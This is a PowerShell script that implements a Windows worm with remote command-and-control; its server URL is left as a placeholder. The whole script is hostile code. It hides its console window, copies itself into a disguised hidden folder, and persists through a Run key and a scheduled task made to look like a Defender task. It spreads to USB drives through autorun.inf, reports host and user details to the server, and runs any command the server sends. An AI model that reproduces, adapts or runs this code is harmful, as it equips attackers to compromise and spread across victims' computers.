$C2Url="__C2URL__";$Int=12;$InstDir="$env:APPDATA\Microsoft\Windows\SystemCache";$AgentPs="$InstDir\update.ps1";$IdFile="$InstDir\.id"
try{Add-Type -Name WH -Namespace W -MemberDefinition '[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);' -EA SilentlyContinue;[W.WH]::ShowWindow([W.WH]::GetConsoleWindow(),0)|Out-Null}catch{}
function Get-Id{if(Test-Path $IdFile){return(Get-Content $IdFile -Raw -EA SilentlyContinue).Trim()};$id="w"+-join((48..57)+(97..102)|Get-Random -Count 7|%{[char]$_});New-Item -ItemType Directory -Path $InstDir -Force -EA SilentlyContinue|Out-Null;$id|Out-File $IdFile -Encoding utf8 -NoNewline -EA SilentlyContinue;return $id}
$AID=Get-Id
function Install-Persist{try{New-Item -ItemType Directory -Path $InstDir -Force|Out-Null;if(-not(Test-Path $AgentPs)){Copy-Item $PSCommandPath $AgentPs -Force};(Get-Item $InstDir -Force -EA SilentlyContinue).Attributes="Hidden,System";(Get-Item $AgentPs -Force -EA SilentlyContinue).Attributes="Hidden";$c="powershell -WindowStyle hidden -NonInteractive -ExecutionPolicy Bypass -File `"$AgentPs`"";Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemCache" -Value $c -Force;schtasks /create /tn "WindowsDefenderCacheUpdate" /tr $c /sc onlogon /rl highest /f 2>$null|Out-Null}catch{}}
function Get-Removable{try{return(Get-WmiObject Win32_LogicalDisk -EA SilentlyContinue|Where-Object{$_.DriveType -eq 2}|Select-Object -ExpandProperty DeviceID)}catch{return @()}}
function Spread-To($D){try{$hd="$D\System Volume Information\.cache";New-Item -ItemType Directory -Path $hd -Force|Out-Null;$dst="$hd\update.ps1";Copy-Item $PSCommandPath $dst -Force;(Get-Item $hd -Force -EA SilentlyContinue).Attributes="Hidden,System";(Get-Item $dst -Force -EA SilentlyContinue).Attributes="Hidden";@"
[AutoRun]`r`nopen=powershell -WindowStyle hidden -ExecutionPolicy Bypass -File "$dst"`r`nlabel=USB Drive
"@|Out-File "$D\autorun.inf" -Encoding ascii -Force;(Get-Item "$D\autorun.inf" -Force -EA SilentlyContinue).Attributes="Hidden,System";return $true}catch{return $false}}
function G($p){try{$w=New-Object System.Net.WebClient;$w.Headers.Add("User-Agent","Mozilla/5.0");return $w.DownloadString("$C2Url$p").Trim()}catch{return ""}}
function P($p,$b){try{$w=New-Object System.Net.WebClient;$w.Headers.Add("User-Agent","Mozilla/5.0");$w.Headers.Add("Content-Type","text/plain");$w.UploadString("$C2Url$p",[string]$b)|Out-Null}catch{}}
function R($c){try{$o=& cmd.exe /c $c 2>&1|Out-String;if($o.Trim()){return $o}else{return "(no output)"}}catch{return "(err:$_)"}}
function Reg{$os=[Uri]::EscapeDataString([Environment]::OSVersion.VersionString);$h=[Uri]::EscapeDataString($env:COMPUTERNAME);$u=[Uri]::EscapeDataString($env:USERNAME);return G "/agent/register?id=$AID&os=$os&hostname=$h&user=$u&type=worm-windows"}
Start-Job -ScriptBlock{param($i,$a,$p)if(-not(Test-Path $a)){New-Item -ItemType Directory -Path $i -Force|Out-Null;Copy-Item $p $a -Force}} -ArgumentList $InstDir,$AgentPs,$PSCommandPath|Out-Null
for($i=0;$i-lt 60;$i++){if((Reg)-like"*OK*"){break};Start-Sleep 5}
while($true){
  try{$cmd=G "/agent/poll?id=$AID"
    switch -Regex($cmd){"^$|^PING$"{};"^REGISTER$"{Reg};"^EXIT$"{exit 0};"^DRIVES$"{P "/agent/result?id=$AID&cmd=DRIVES"(@(Get-Removable)-join"`n")};"^SPREAD$"{$r=@(Get-Removable)|%{"$_`: $(Spread-To $_)"};P "/agent/result?id=$AID&cmd=SPREAD"($r-join"`n")};"^PERSIST$"{Install-Persist;P "/agent/result?id=$AID&cmd=PERSIST" "reinstalled"};default{P "/agent/result?id=$AID&cmd=$([Uri]::EscapeDataString($cmd))"(R $cmd)}}
  }catch{}
  Start-Sleep $Int}
